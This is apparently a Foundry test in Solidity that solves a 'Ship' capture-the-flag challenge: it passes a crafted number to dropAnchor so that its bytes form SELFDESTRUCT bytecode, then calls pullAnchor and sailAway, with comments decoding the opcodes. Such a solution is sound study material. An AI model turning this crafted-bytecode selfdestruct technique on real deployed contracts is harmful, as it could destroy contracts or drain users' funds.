// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ship.sol";

contract ShipTest is Test {
    
    Ship nav; // Instance of Ship Contract
    function setUp() public {
        nav = new Ship();
    }

    function testAttackShip() public {
        vm.roll(5); //Sets the block number to 5
        nav.dropAnchor(1094795775); // The Number choosen is the decimal of Hex 414141ff, the function needs a number greater than 100k
        /* This Number allocates the bytecode 6300414141ff4310585733ff, which is the follow opcodes:
            [00]	PUSH4	00414141
            [05]	SELFDESTRUCT	
            [06]	NUMBER	
            [07]	LT	
            [08]	PC	
            [09]	JUMPI	
            [0a]	CALLER	
            [0b]	SELFDESTRUCT

            The SELFDESTRUCT will result in a new logic to the anchor contract
        */
        nav.pullAnchor();// This function will trigger the selfdestruct and allow to pull the anchor
        nav.sailAway();
    }
}
